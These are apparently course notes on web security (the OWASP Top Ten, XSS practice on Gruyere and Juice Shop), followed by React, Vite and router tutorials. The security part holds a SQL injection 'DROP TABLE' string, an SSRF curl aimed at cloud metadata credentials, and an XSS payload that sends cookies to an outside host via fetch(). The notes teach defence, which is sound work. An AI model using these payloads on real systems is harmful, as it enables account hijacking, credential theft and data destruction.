Log4Shell remote code execution vulnerability, 93% of cloud vulnerable at time of discovery, dubbed "the most severe vulnerability ever"
Russian hackers install backdoor on 18,000 government and Fortune 500 computers
Hackers Hold Computers of 23 Texas Towns For Ransom
Common hacking techniques
There are a few common exploitation techniques that you should be aware of. These include the following.
Injection: When an application interacts with a database on the backend, a programmer will often take user input and concatenate it directly into a search query. This allows a hacker can use a specially crafted query to make the database reveal hidden information or even delete the database.
Cross-Site Scripting (XSS): A category of attacks where an attacker can make malicious code execute on a different user's browser. If successful, an attacker can turn a website that a user trusts, into one that can steal passwords and hijack a user's account.
Denial of Service: This includes any attack where the main goal is to render any service inaccessible. This can be done by deleting a database using an SQL injection, by sending unexpected data to a service endpoint that causes the program to crash, or by simply making more requests than a server can handle.
Credential Stuffing: People have a tendency to reuse passwords or variations of passwords on different websites. If a hacker has a user's credentials from a previous website attack, then there is a good chance that they can successfully use those credentials on a different website. A hacker can also try to brute force attack a system by trying every possible combination of password.
Social engineering - Appealing to a human's desire to help, in order to gain unauthorized access or information.
What can I do about it?
Taking the time to learn the techniques a hacker uses to attack a system is the first step in preventing them from exploiting your systems. From there, develop a security mindset, where you always assume any attack surface will be used against you. Make security a consistent part of your application design and feature discussions. Here is a list of common security practices you should include in your applications.
Sanitize input data - Always assume that any data you receive from outside your system will be used to exploit your system. Consider if the input data can be turned into an executable expression, or can overload computing, bandwidth, or storage resources.
Logging - It is not possible to think of every way that your system can be exploited, but you can create an immutable log of requests that will expose when a system is being exploited. You can then trigger alerts, and periodically review the logs for unexpected activity.
Traps - Create what appears to be valuable information and then trigger alarms when the data is accessed.
Educate - Teach yourself, your users, and everyone you work with, to be security minded. Anyone who has access to your system should understand how to prevent physical, social, and software attacks.
Reduce attack surfaces - Do not open access anymore than is necessary to properly provide your application. This includes what network ports are open, what account privileges are allowed, where you can access the system from, and what endpoints are available.
Layered security - Do not assume that one safeguard is enough. Create multiple layers of security that each take different approaches. For example, secure your physical environment, secure your network, secure your server, secure your public network traffic, secure your private network traffic, encrypt your storage, separate your production systems from your development systems, put your payment information in a separate environment from your application environment. Do not allow data from one layer to move to other layers. For example, do not allow an employee to take data out of the production system.
Least required access policy - Do not give any one user all the credentials necessary to control the entire system. Only give a user what access they need to do the work they are required to do.
Safeguard credentials - Do not store credentials in accessible locations such as a public GitHub repository or a sticky note taped to a monitor. Automatically rotate credentials in order to limit the impact of an exposure. Only award credentials that are necessary to do a specific task.
Public review - Do not rely on obscurity to keep your system safe. Assume instead that an attacker knows everything about your system and then make it difficult for anyone to exploit the system. If you can attack your system, then a hacker will be able to also. By soliciting public review and the work of external penetration testers, you will be able to discover and remove potential exploits.
OWASP

📖 Deeper dive reading: OWASP 2021
The Open Web Application Security Project (OWASP) is a non-profit research entity that manages the Top Ten list of the most important web application security risks. Understanding, and periodically reviewing, this list will help to keep your web applications secure.
The following is a discussion of each of the entries in the top ten list, along with examples, and suggested mitigations.
A01 Broken Access Control
📖 Deeper dive reading: snyk Learn broken access control
Broken access control occurs when the application doesn't properly enforce permissions on users. This could mean that a non-admin user can do things that only an admin should be able to do, or admin accounts are improperly secured. While browser application code can restrict access by disabling UI for navigating to sensitive functionality, the ultimate responsibility for enforcing access control rests upon the application service.
As an example of broken access control, consider an application where the UI only provides a navigation to the administrator application settings if the user is an administrator. However, the attacker can simply change the URL to point to the application settings URL and gain access. Additionally, unless the service endpoints reject requests to obtain, and update, the application settings, any restrictions that the UI provides are meaningless.
Mitigations include:
Strict access enforcement at the service level
Clearly defined roles and elevation paths
A02 Cryptographic Failures
Cryptographic failures occur when sensitive data is accessible either without encryption, with weak encryption protocols, or when cryptographic protections are ignored.
Sending any unencrypted data over a public network connection allows an attacker to capture the data. Even private, internal, network connections, or data that is store without encryption, is susceptibly to exploitation once an attacker gains access to the internal system.
Examples of ineffective cryptographic methods include hashing algorithms like MD5 and SHA-1 that are trivial to crack with modern hardware and tools.
Another cryptographic failure happens when applications do not validate the provided web certificate when establishing a network connection. This is a case of falsely assuming that if the protocol is secure then the entity represented by the protocol is acceptable.
Mitigations include:
Use strong encryption for all data. This includes external, internal, in transit, and at rest data.
Updating encryption algorithms as older algorithms become compromised.
Properly using cryptographic safeguards.
A03 Injection
📖 Deeper dive reading: Snyk Learn SQL injection
Injection exploits occur when an attacker is allowed to supply data that is then injected into a context where it violates the expected use of the user input. For example, consider an input field that is only expected to contain a user's password. Instead the attacker supplies a SQL database command in the password input.
Supplied password
`p@ssword!'; DROP TABLE db; --`;

The application then uses a template SQL query to validate the user's password.
Template query
`SELECT user FROM db WHERE password='${password}' LIMIT 1`;

When the supplied input is injected into the template an unintended query results. Notice that this query will delete the entire database table.
Resulting query
SELECT user FROM db WHERE password='p@ssword!'; DROP TABLE db; -- ` LIMIT 1

Mitigations include:
Sanitizing input
Use database prepared statements
Restricting execution rights
Limit output
A04 Insecure Design
📖 Deeper dive reading: Snyk Learn insecure design
Insecure design broadly refers to architectural flaws that are unique for individual systems, rather than implementation errors. This happens when the application team doesn't focus on security when designing a system, or doesn't continuously reevaluate the application's security.
Insecure design exploits are based upon unexpected uses of the business logic that controls the functionality of the application. For example, if the application allows for trial accounts to be easily created, then an attacker could create a denial of service attack by creating millions of accounts and utilizing the maximum allowable usage.
Mitigations include:
Integration testing
Strict access control
Security education
Security design pattern usages
Scenario reviews
A05 Security Misconfiguration
Security misconfiguration attacks exploit the configuration of an application. Some examples include using default passwords, not updating software, exposing configuration settings, or enabling unsecured remote configuration.
For example, some third party utilities, such as a logging system, will expose a public administration interface that has a default user name and password. Unless that configuration is changed, an attacker will be able to access all of the critical logging information for your application.
Mitigations include:
Configuration reviews
Setting defaults to disable all access
Automated configuration audits
Requiring multiple layers of access for remote configuration
A06 Vulnerable and Outdated Components
📖 Deeper dive reading: Snyk Learn vulnerable and outdate components
The longer an application has been deployed, the more likely it is that the attack surface, and corresponding exploits, of the application will increase. This is primarily due to the cost of maintaining an application and keeping it up to date in order to mitigate newly discovered exploits.
Outdated components often accumulate as third party packages are used by the application. Over time the packages are updated in order to address security concerns, or somethings the packages stop being supported. When this happens your application becomes vulnerable. Consider what happens when a request to install NPM packages displays the following warning:
➜  npm install

up to date, audited 1421 packages in 3s

7 high severity vulnerabilities

To address all issues (including breaking changes), run:
  npm audit fix --force

Run `npm audit` for details.

The application developer is warned that the components are vulnerable, but when faced choice of taking the time to update packages, and potentially break the application, or meeting deliverable deadlines, the developer is tempted to ignore the warning and continue without addressing the possible problem.
Mitigations include:
Keeping a manifest of your software stack including versions
Reviewing security bulletins
Regularly updating software
Required components to be up to date
Replacing unsupported software
A07 Identification and Authentication Failures
Identification and authentication failures include any situation where a user's identity can be impersonated or assumed by an attacker. For example, if an attacker can repeatedly attempt to guess a user's password, then eventually they will be successful. Additionally, if passwords are exposed outside of the application, or are stored inside the application, with weak cryptographic protection, then they are susceptible to attack.
Another example of an identification failure would be a weak password recovery process that doesn't properly verify the user. Common practices such as asking for well known security questions (e.g. mother's maiden name) from a user fall into this category.
Mitigations include:
Rate limiting requests
Properly managing credentials
Multifactor authentication
Authentication recovery
A08 Software and Data Integrity Failure
Software and data integrity failures represent attacks that allow external software, processes, or data to compromise your application. Modern web applications extensively use open source and commercially produced packages to provide key functionality. Using these packages without conducting a security audit, gives them an unknown amount of control over your application. Likewise, using a third party processing workflow, or blindly accessing external data, opens you up to attacks.
Consider the use of a third party continuous delivery (CD) pipeline for deploying your application to a cloud provider. If the CD provider is penetrated by an attacker then they also gain access to your production cloud environment.
Another example is the use of an NPM package that is controlled by an attacker. Once the package has gained general acceptance, the attacker can subtly change the package to capture and deliver sensitive information.
Mitigations include:
Only using trusted package repositories
Using your own private vetted repository
Audit all updates to third party packages and data sources
A09 Security Logging and Monitoring Failures
📖 Deeper dive reading: Snyk Learn logging vulnerabilities
Proper system monitoring, logging, and alerting is critical to increasing security. One of the first things an attacker will do after penetrating your application is delete or alter any logs that might reveal the attacker's presence. A secure system will store logs that are accessible, immutable, and contain adequate information to detect an intrusion, and conduct post-mortem analysis.
An attacker might also try to create a smoke screen in the monitoring system in order to hide a true attack. This might consist of a barrage of periodic ineffective attacks that hide the insertion of a slightly different effective one.
Mitigations include:
Real time log processing
Automated alerts for metric threshold violations
Periodic log reviews
Visual dashboards for key indicators
A10 Server Side Request Forgery (SSRF)
📖 Deeper dive reading: Snyk Learn SSRF
This category of attack causes the application service to make unintended internal requests, that utilized the service's elevated privileges, in order to expose internal data or services.
For example, if your service exposed an endpoint that let a user retrieve an external profile image based upon a supplied URL, an attacker could change the URL to point to a location that is normally only available to the service internally.
The following command would theoretically return the internal AWS service metadata that includes the administrative access token.
curl https://yourdomain.click/user/image?imgUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/Admin-Role

Mitigations include:
Sanitizing returned data
Not returning data
Whitelisting accessible domains
Rejecting HTTP redirects

Security practice
You will not really internalize how security exploits work until you get some practice with them. One way to do this is to use a practice security web applications. There are lots of practice applications but we will discuss two of them, Gruyere and Juice Shop.
Gruyere
Gruyere provides tutorials and practice with things like Cross-site scripting (XSS), Denial of Service (DoS), SQL injection, and elevation of privilege attacks.
Gruyere runs on Google AppEngine and so it is easy to start, play with, and reset when you want to start over.
You can learn about how to use Gruyere by reading the set up page. Make sure you notice the Table of Contents located on the right side of the page in order to learn about the different attacks and how to exploit them.
You start the practice environment by following this link. This will display a page that looks like the following.

For the purposes of this instruction we are only going to talk about Cross-Site Scripting (XSS) attacks. Feel free to explore everything provided by Gruyere as your time and interest allows.
Cross-Site Scripting (XSS)
Open the Gruyere Instruction on XSS. Take some time to read the description of XSS attacks and then open up the practice instance of Gruyere that you created above.
Using what we have learned from the tasks, hints, and examples described in the Gruyere instruction, we will create our own XSS attack.
Create an account in the Gruyere application using some bogus user name and password.
Navigate back to the home page.
Select the New Snippets option in order to create a snippet that will show on the home screen for all users of the application.
The Gruyere developers assumed the snippet functionality would be used to share information about cheese, but you will use it to execute a XSS attack on anyone who views your snippet.
Paste the following into the snippet input box and press submit.
<img src="null" onerror="document.body.style.background='white'" />

Now, whenever any user of Gruyere goes to their home page they will see your snippet, and it will execute the JavaScript XSS attack and turn their body background color white.

If you logout of Gruyere and create a new user account, you will see that your attack works on all users.
Changing the background color isn't very much of an attack, but it does visually demonstrate that you are have taken control of the application. You could just have easily grabbed the user's cookie and sent it to a service endpoint where you could start collecting information on Gruyere customers.
<img src="null" onerror="fetch(`https://hkz.click/xss/${document.cookie}`)" />

If you create another snippet with the above example, open up the network tab in the browser's dev tools, and navigate to the Gruyere home page, you will see the browser attempting to send the user's cookie to hkz.click.

Juice Shop

OWASP provides a security training application called Juice Shop. Unlike Gruyere, You need to download the code for Juice Shop and run it from your own computer, but the advantage is that you have complete control over Juice Shop and it is a really good practice application.
If you are at all interested in improving your security skills, you should take the time to install and explore Juice Shop. Otherwise what you have done with Gruyere should be enough to give you a feel for what security practice applications have to offer.
Installing Juice Shop
Clone the Juice Shop repository to your development environment and install the required NPM packages.
git clone https://github.com/juice-shop/juice-shop.git --depth 1

cd juice-shop

npm install


Run the application. This should start Juice Shop on port 3000.
npm start


You can now open your browser to localhost:3000. This will display the Juice Shop application.

Getting started
The idea with Juice Shop is that you are suppose to learn by digging in and experimenting. For a person that is new to security hacking this can be a bit daunting, and so here is a hint to get you started.
You can solve the first hacking challenge by discovering the hidden score board view that shows you all of the possible challenges to solve, and exposes the available tutorials. You can discover where the score board is by examining the contents of the main.js file in Dev Tools and seeing that it references a path named score-board. So if you change the url to be localhost:3000/#/score-board you will see the following view.

You can then find a challenge that looks interesting and try to solve it. Challenges that have a tutorial icon will step you through the challenge and explain how it works. You can then use that knowledge to solve challenges that don't have a tutorial.
To begin, it is suggested that you do the DOM XSS tutorial. This will show you how to do a XSS attack using the application search input.

Web frameworks
📖 Deeper dive reading: MDN Introduction to client-side frameworks
Web frameworks seek to make the job of writing web applications easier by providing tools for completing common application tasks. This includes things like modularizing code, creating single page applications, simplifying reactivity, and supporting diverse hardware devices.
Some frameworks take things beyond the standard web technologies (HTML, CSS, JavaScript) and create new hybrid file formats that combine things like HTML and JavaScript into a single file. Examples of this include React JSX, Vue SFC, and Svelte files. Abstracting away the core web file formats puts the focus on functional components rather than files.
There are lots of web frameworks to choose from and they evolve all the time. You can view the latest popularity poll at StateOfJS.

- Source: StateOfJS web framework poll
Each framework has advantages and disadvantages. Some are very prescriptive (opinionated) about how to do things, some have major institutional backing, and others have a strong open source community. Other factors you want to consider include how easy it is to learn, how it impacts productivity, how performant it is, how long it takes to build, and how actively the framework is evolving.
Hello world examples
For our classwork we will use the web framework React. However, before we dig into React let's look at how the major frameworks would render a simple hello world application.
Vue
Vue combines HTML, CSS, and JavaScript into a single file. HTML is represented by a template element that can be aggregated into other templates.
SFC
<script>
  export default {
    data() {
      return {
        name: 'world',
      };
    },
  };
</script>

<style>
  p {
    color: green;
  }
</style>

<template>
  <p>Hello {{ name }}!</p>
</template>

Svelte
Like Vue, Svelte combines HTML, CSS, and JavaScript into a single file. The difference here is that Svelte requires a transpiler to generate browser-ready code, instead of a runtime virtual DOM.
Svelte file
<script>
  let name = 'world';
</script>

<style>
  p {
    color: green;
  }
</style>

<p>Hello {name}!</p>

React
React combines JavaScript and HTML into its component format. CSS must be declared outside of the JSX file. The component itself highly leverages the functionality of JavaScript and can be represented as a function or class.
JSX
import 'hello.css';

const Hello = () => {
  let name = 'world';

  return <p>Hello {name}</p>;
};

CSS
p {
  color: green;
}

Angular component
An Angular component defines what JavaScript, HTML, and CSS are combined together. This keeps a fairly strong separation of files that are usually grouped together in a directory rather than using the single file representation.
JS
@Component({
  selector: 'app-hello-world',
  templateUrl: './hello-world.component.html',
  styleUrls: ['./hello-world.component.css'],
})
export class HelloWorldComponent {
  name: string;
  constructor() {
    this.name = 'world';
  }
}

HTML
<p>hello {{name}}</p>

CSS
p {
  color: green;
}

React

🎥 Instruction video: React introduction
📖 Recommended reading:
MDN React Introduction Tutorial
React Quick Start
React, and its associated projects, provide a powerful web programming framework. The name React comes from its focus on making reactive web page components that automatically update based on user interactions or changes in the underlying data.

“The best drug is getting little things done that have been weighing on you. Instant high.”
— Jordan Walke (Source: Twitter)
React was created by Jordan Walke for use at Facebook in 2011. It was first used with Facebook's news feed and then as the main framework for Instagram. Shortly thereafter, Facebook open sourced the framework and it was quickly adopted by many popular web applications.
React abstracts HTML into a JavaScript variant called JSX. JSX is converted into valid HTML and JavaScript using a preprocessor called Babel. For example, the following is a JSX file. Notice that it mixes both HTML and JavaScript into a single representation.
const i = 3;
const list = (
  <ol class='big'>
    <li>Item {i}</li>
    <li>Item {3 + i}</li>
  </ol>
);

Babel will convert that into valid JavaScript:
const i = 3;
const list = React.createElement(
  'ol',
  { class: 'big' },
  React.createElement('li', null, 'Item ', i),
  React.createElement('li', null, 'Item ', 3 + i)
);

The React.createElement function will then generate DOM elements and monitor the data they represent for changes. When a change is discovered, React will trigger dependent changes.

Components
📖 Recommended reading: React.dev - Your First Component
React components allow you to modularize the functionality of your application. This allows the underlying code to directly represent the components that a user interacts with. It also enables code reuse as common application components often show up repeatedly.
The render function
One of the primary purposes of a component is to generate the user interface. This is done with the component's render function. Whatever is returned from the render function is inserted into the component HTML element.
As a simple example, a JSX file containing a React component element named Demo would cause React to load the Demo component, call the render function, and insert the result into the place of the Demo element.
JSX
<div>
  Component: <Demo />
</div>

Notice that Demo is not a valid HTML element. The transpiler will replace this tag with the resulting rendered HTML.
React component
function Demo() {
  const who = 'world';
  return <b>Hello {who}</b>;
}

Resulting HTML
<div>Component: <b>Hello world</b></div>

Properties
React components also allow you to pass information to them in the form of element properties. The component receives the properties in its constructor and then can display them when it renders.
JSX
<div>Component: <Demo who="Walke" /><div>

React component
function Demo(props) {
  return <b>Hello {props.who}</b>;
}

Resulting HTML
<div>Component: <b>Hello Walke</b></div>

State
In addition to properties, a component can have internal state. Component state is created by calling the React.useState hook function. The useState function returns a variable that contains the current state and a function to update the state. The following example creates a state variable called clicked and toggles the click state in the updateClicked function that gets called when the paragraph text is clicked.
const Clicker = () => {
  const [clicked, updateClicked] = React.useState(false);

  const onClicked = (e) => {
    updateClicked(!clicked);
  };

  return <p onClick={(e) => onClicked(e)}>clicked: {`${clicked}`}</p>;
};

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<Clicker />);

You should note that you can use JSX even without a function. A simple variable representing JSX will work anyplace you would otherwise provide a component.
const hello = <div>Hello</div>;

ReactDOM.render(hello, document.getElementById('root'));

Class style components
In addition to the preferred function style components demonstrated above, React also supports class style components. However, you should note that the React team is moving away from the class style representation, and for that reason you should probably not use it. With that said, you are likely to see class style components and so you should be aware of the syntax. Below is the equivalent class style component for the Clicker component that we created above.
The major difference is that properties are loaded on the constructor and state is set using a setState function on the component object.
class Clicker extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      clicked: false,
    };
  }
  onClicked() {
    this.setState({
      clicked: !this.state.clicked,
    });
  }
  render() {
    return <p onClick={(e) => this.onClicked(e)}>clicked: {`${this.state.clicked}`}</p>;
  }
}

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<Clicker />);

Reactivity
A component's properties and state are used by the React framework to determine the reactivity of the interface. Reactivity controls how a component reacts to actions taken by the user or events that happen within the application. Whenever a component's state or properties change, the render function for the component and all of its dependent component render functions are called.
☑ Assignment
Create a fork of this CodePen and experiment.
Try the following:
Add a new property to the Demo component that provides the background color for the component.
Add another state variable that changes the color on a mouse over event.
When you are done submit your CodePen URL to the Canvas assignment.
🧧 Possible solution
If you get stuck here is a possible solution.
function App() {
  return (
    <div>
      Function Style Component: <Demo who='function' initialColor='yellow' />
    </div>
  );
}

const Demo = ({ who, initialColor }) => {
  const [color, setColor] = React.useState(initialColor);
  const [outlook, setOutlook] = React.useState('beautiful');

  function changeOutlook() {
    setOutlook(outlook === 'exciting' ? 'beautiful' : 'exciting');
  }

  function changeColor() {
    var randomColor = Math.floor(Math.random() * 16777215).toString(16);
    setColor('#' + randomColor);
  }

  return (
    <div className='component' onMouseOver={changeColor} style={{ background: color }}>
      <p>
        Hello {outlook} {who}
      </p>
      <button onClick={changeOutlook}>change</button>
    </div>
  );
};
Toolchains
As web programming becomes more and more complex it became necessary to abstract away some of that complexity with a series of tools. Some common functional pieces in a web application tool chain include:
Code repository - Stores code in a shared, versioned location.
Linter - Removes, or warns of, non-idiomatic code usage.
Prettier - Formats code according to a shared standard.
Transpiler - Compiles code into a different format. For example, from JSX to JavaScript, TypeScript to JavaScript, or SCSS to CSS.
Polyfill - Generates backward compatible code for supporting old browser versions that do not support the latest standards.
Bundler - Packages code into bundles for delivery to the browser. This enables compatibility (for example with ES6 module support), or performance (with lazy loading).
Minifier - Removes whitespace and renames variables in order to make code smaller and more efficient to deploy.
Testing - Automated tests at multiple levels to ensure correctness.
Deployment - Automated packaging and delivery of code from the development environment to the production environment.
The toolchain that we use for our React project consists of GitHub as the code repository, Vite for JSX, TS, development and debugging support, ESBuild for converting to ES6 modules and transpiling (with Babel underneath), Rollup for bundling and tree shaking, PostCSS for CSS transpiling, and finally a simple bash script (deployReact.sh) for deployment.
You don't have to fully understand what each of these pieces in the chain are accomplishing, but the more you know about them the more you can optimize your development efforts.
In the following instruction we will show you how to use Vite to create a simple web application using the tools mentioned above. We will then demonstrate how to convert your startup into a modern web application by converting Simon to use Vite and React.


Vite
📖 Deeper dive reading: Vite
Now that we have covered the basics of React, we want to extend our usage to include a full web framework toolchain that allows us to use JSX, minification, polyfills, and bundling for our Simon and startup applications. One common way for configuring your project to take advantage of these technologies is to use a Command Line Interface (CLI) to initially set up a web application. Using a CLI saves you the trouble of configuring the toolchain parameters and gets you quickly started with a default application.
For our toolchain we are going to use Vite. Vite bundles your code quickly, has great debugging support, and allows you to easily support JSX, TypeScript, and different CSS flavors. To get started with Vite, let's first build a simple web application. Later we will convert Simon over to React using Vite. This will teach you what you need to know in order to move your startup to React.
To create a new React-based web application using Vite, open your console and run the following commands:
npm create vite@latest demoVite -- --template react
cd demoVite
npm install
npm run dev

This will create a new web application in the demoVite directory, download the required 3rd party packages, and start up the application using a local HTTP debugging server. You can tell Vite to open your browser to the URL that is hosting your application by pressing o, or press h to see all of the Vite CLI options.

Congratulations! You have just created your first React-enabled web application.
Once you have played around with the application in your browser, you can return to your console and stop Vite from hosting the application by pressing q.
Generated project
Now, let's explore the application files that Vite created. From the console, use VS Code (code .) to open the project directory and take a look at the files.
Directory
File
Purpose
./






index.html
Primary page for the application. This is the starting point to load all of the JSX components beginning with main.jsx.


package.json
NPM definition for package dependencies and script commands. This is what maps npm run dev to actually start up Vite.


package-lock.json
Version constraints for included packages (do not edit this).


vite.config.js
Configuration setting for Vite. Specifically this sets up React for development.
./public






vite.svg
Vite logo for use as favicon and for display in the app.
./src






main.jsx
Entry point for code execution. This simply loads the App component found in App.jsx.


index.css
CSS for the entire application.


App.jsx
JSX for top level application component. This displays the logs and implements the click counter.


App.css
CSS for the top level application component.
./src/assets






react.svg
React logo for display in the app.

The main files in the application are index.html, main.jsx, and App.jsx. The browser loads index.html which provides the HTML element (#root) that the React application will be injected into. It also includes the script element to load main.jsx.
main.jsx creates the React application by associating the #root element with the App component found in App.jsx. This causes all of the component render functions to execute and the generated HTML, CSS, and JavaScript to be executed in index.html.

JSX vs JS
The Vite CLI uses the .jsx extension for JSX files instead of the JavaScript .js extension. The Babel transpiler will work with either one, but some editor tools will work differently based upon the extension. For this reason, you should prefer .jsx for files that contain JSX. The developers at AirBNB had an interesting conversation on this topic that you might browse if you would like to consider the differing opinions on this subject.
Building a production release
When you execute npm run dev you are bundling the code to a temporary directory that the Vite debug HTTP server loads from. When you want to bundle your application so that you can deploy to a production environment you need to run npm run build. This executes the build script found in your package.json and invokes the Vite CLI. vite build transpiles, minifies, injects the proper JavaScript, and then outputs everything to a deployment-ready version contained in a distribution subdirectory named dist.
➜  npm run build

> demovite@0.0.0 build
> vite build

vite v4.3.7 building for production...
✓ 34 modules transformed.
dist/index.html                   0.45 kB │ gzip:  0.30 kB
dist/assets/react-35ef61ed.svg    4.13 kB │ gzip:  2.14 kB
dist/assets/index-51439b3f.css    1.42 kB │ gzip:  0.74 kB
dist/assets/index-58d24859.js   143.42 kB │ gzip: 46.13 kB
✓ built in 382ms

Deploying a production release
The deployment script for Simon React (deployReact.sh) creates a production distribution by calling npm run build and then copying the resulting dist directory to your production server.
Take some time to build a production release by running npm run build. Then examine what Vite actually builds by examining the dist directory. For example, if you look at the dist/assets directory you will see the bundled and minified JavaScript and CSS files.
☑ Assignment
Now that you have reviewed the application in VS Code, take a moment to manipulate the files and see what impact your changes have. If you break the application, and can't figure out how to fix it, just delete the demo directory and start again. The more you play around with this code, the better you will understand how all the pieces of the application fit together.
Make the following modifications:
Alter the CSS to change background and text colors to something different.
Replace the text in the App component with your name.
Change the counter to increment by 10 instead of by one.
After these changes, the application should look similar to this:

When you are done, submit a screen capture of the altered application to the Canvas assignment.
Don't forget to update your GitHub startup repository notes.md with all of the things you learned and want to remember.

Router
🔑 Required reading: React Router DOM Tutorial
A web framework router provides essential functionality for single-page applications. With a multiple-webpage application the headers, footers, navigation, and common components must be either duplicated in each HTML page, or injected before the server sends the page to the browser. With a single page application, the browser only loads one HTML page and then JavaScript is used to manipulate the DOM and give it the appearance of multiple pages. The router defines the routes a user can take through the application, and automatically manipulates the DOM to display the appropriate framework components.
React does not have a standard router package, and there are many that you can choose from. We will use react-router-dom Version 6. The simplified routing functionality of React-router-dom derives from the project react-router for its core functionality. Do not confuse the two, or versions of react-router-dom before version 6, when reading tutorials and documentation.

A basic implementation of the router consists of a BrowserRouter component that encapsulates the entire application and controls the routing action. The Link, or NavLink, component captures user navigation events and modifies what is rendered by the Routes component by matching up the to and path attributes.
// Inject the router into the application root DOM element
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  // BrowserRouter component that controls what is rendered
  // NavLink component captures user navigation requests
  // Routes component defines what component is routed to
  <BrowserRouter>
    <div className='app'>
      <nav>
        <NavLink to='/'>Home</Link>
        <NavLink to='/about'>About</Link>
        <NavLink to='/users'>Users</Link>
      </nav>

      <main>
        <Routes>
          <Route path='/' element={<Home />} exact />
          <Route path='/about' element={<About />} />
          <Route path='/users' element={<Users />} />
          <Route path='*' element={<Navigate to='/' replace />} />
        </Routes>
      </main>
    </div>
  </BrowserRouter>
);

☑ Assignment
Create a fork of this CodePen and add another component for the path of /scores.
When you are done submit your CodePen URL to the Canvas assignment.
Don't forget to update your GitHub startup repository notes.md with all of the things you learned and want to remember.

Reactivity
Making the UI react to changes in user input or data, is one of the architectural foundations of React. React enables reactivity with three major pieces of a React component: props, state, and render.
When a component's JSX is rendered, React parses the JSX and creates a list of any references to the component's state or prop objects. React then monitors those objects and if it detects that they have changed it will call the component's render function so that the impact of the change is visualized.
The following example contains two components: a parent <Survey/> component and a child <Question/> component. The Survey has a state named color. The Question has a property named answer. The Survey passes its color state to the Question as a property. This means that any change to the Survey's color will also be reflected in the Question's color. This is a powerful means for a parent to control a child's functionality.
Be careful about your assumptions of when state is updated. Just because you called updateState does not mean that you can access the updated state on the next line of code. The update happens asynchronously, and therefore you never really know when it is going to happen. You only know that it will eventually happen.
const Survey = () => {
  const [color, updateColor] = React.useState('#737AB0');

  // When the color changes update the state
  const onChange = (e) => {
    updateColor(e.target.value);
  };

  return (
    <div>
      <h1>Survey</h1>

      {/* Pass the Survey color  as a parameter to the Question.
          When the color changes the Question parameter will also be updated and rendered. */}
      <Question answer={color} />

      <p>
        <span>Pick a color: </span>
        {/* Set the Survey color state as a the value of the color picker.
            When the color changes, the value will also be updated and rendered. */}
        <input type='color' onChange={(e) => onChange(e)} value={color} />
      </p>
    </div>
  );
};

// The Question component
const Question = ({ answer }) => {
  return (
    <div>
      {/* Answer rerendered whenever the parameter changes */}
      <p>Your answer: {answer}</p>
    </div>
  );
};

ReactDOM.render(<Survey />, document.getElementById('root'));

☑ Assignment
Create a fork of this CodePen and experiment. Try changing the input from using the color and radio button, to using an edit box that reactively displays the text as you type.
When you are done submit your CodePen URL to the Canvas assignment.
Don't forget to update your GitHub startup repository notes.md with all of the things you learned and want to remember.
🧧 Possible solution
If you get stuck here is a possible solution.
const Survey = () => {
  const [text, updateText] = React.useState('');

  const onChange = (e) => {
    updateText(e.target.value);
  };
  return (
    <div>
      <h1>Survey</h1>
      <Question answer={text} />

      <p>
        <span>Type some text: </span>
        <input
          type='text'
          onChange={(e) => onChange(e)}
          placeholder='type here'
        />
      </p>
    </div>
  );
};

const Question = ({ answer }) => {
  return (
    <div>
      <p>You typed: {answer}</p>
    </div>
  );
};
React hooks
📖 Recommended reading: Reactjs.org - Hooks Overview
React hooks allow React function style components to be able to do everything that a class style component can do and more. Additionally, as new features are added to React they are including them as hooks. This makes function style components the preferred way of doing things in React. You have already seen one use of hooks to declare and update state in a function component with the useState hook.
function Clicker({initialCount}) {
  const [count, updateCount] = React.useState(initialCount);
  return <div onClick={() => updateCount(count + 1)}>Click count: {count}</div>;
}

ReactDOM.render(<Clicker initialCount={3} />, document.getElementById('root'));

useEffect hook
The useEffect hook allows you to represent lifecycle events. For example, if you want to run a function every time the component completes rendering, you could do the following.
function UseEffectHookDemo() {
  React.useEffect(() => {
    console.log('rendered');
  });

  return <div>useEffectExample</div>;
}

ReactDOM.render(<UseEffectHookDemo />, document.getElementById('root'));

You can also take action when the component cleans up by returning a cleanup function from the function registered with useEffect. In the following example, every time the component is clicked the state changes and so the component is rerendered. This causes both the cleanup function to be called in addition to the hook function. If the function was not rerendered then only the cleanup function would be called.
function UseEffectHookDemo() {
  const [count, updateCount] = React.useState(0);
  React.useEffect(() => {
    console.log('rendered');

    return function cleanup() {
      console.log('cleanup');
    };
  });

  return <div onClick={() => updateCount(count + 1)}>useEffectExample {count}</div>;
}

ReactDOM.render(<UseEffectHookDemo />, document.getElementById('root'));

This is useful when you want to create side effects for things such as tracking when a component is displayed or hidden, or creating and disposing of resources.
Hook dependencies
You can control what triggers a useEffect hook by specifying its dependencies. In the following example we have two state variables, but we only want the useEffect hook to be called when the component is initially called and when the first variable is clicked. To accomplish this you pass an array of dependencies as a second parameter to the useEffect call.
function UseEffectHookDemo() {
  const [count1, updateCount1] = React.useState(0);
  const [count2, updateCount2] = React.useState(0);

  React.useEffect(() => {
    console.log(`count1 effect triggered ${count1}`);
  }, [count1]);

  return (
    <ol>
      <li onClick={() => updateCount1(count1 + 1)}>Item 1 - {count1}</li>
      <li onClick={() => updateCount2(count2 + 1)}>Item 2 - {count2}</li>
    </ol>
  );
}

ReactDOM.render(<UseEffectHookDemo />, document.getElementById('root'));

If you specify an empty array [] as the hook dependency then it is only called when the component is first rendered.
Note that hooks can only be used in function style components and must be called at the top scope of the function. That means a hook cannot be called inside of a loop or conditional. This restriction ensures that hooks are always called in the same order when a component is rendered.

Simon React
🎥 Instruction video: Simon React

This deliverable demonstrates using React as a web framework and Vite as your frontend tooling. This helps with tasks such as building modular components, providing reactive UI elements, supporting sessions, lazy loading, and reducing (minifying) the size of your application.
As part of the move to React, we convert Simon from a multi-page application to a single-page application. In a single-page application, the browser only loads a single HTML file (index.html), and then we use JavaScript to interactively change the rendered content and components. This is a significant architectural shift to the application and will require you to reorganize your code to fit the single-page, component driven, model.
Steps to convert Simon to React
The following section discusses the general steps taken to convert the Simon application from a simple HTML/CSS/JavaScript application to a React application. You will need to take similar steps for your startup project, and so it is important to understand what is happening at each step of the conversion process. You don't necessarily have to go through this process with the Simon demonstration application, but it is a safe place to try since you have both the starting version (simon-websocket) and the ending version (simon-react) to reference.
We begin by introducing vite, our frontend tooling. The HTML, CSS, and JavaScript is then reworked into React components. The React components are then reworked to take advantage of functionality that React provides. This includes function style components, modularization, reactive interactions, and a React representation of Bootstrap.
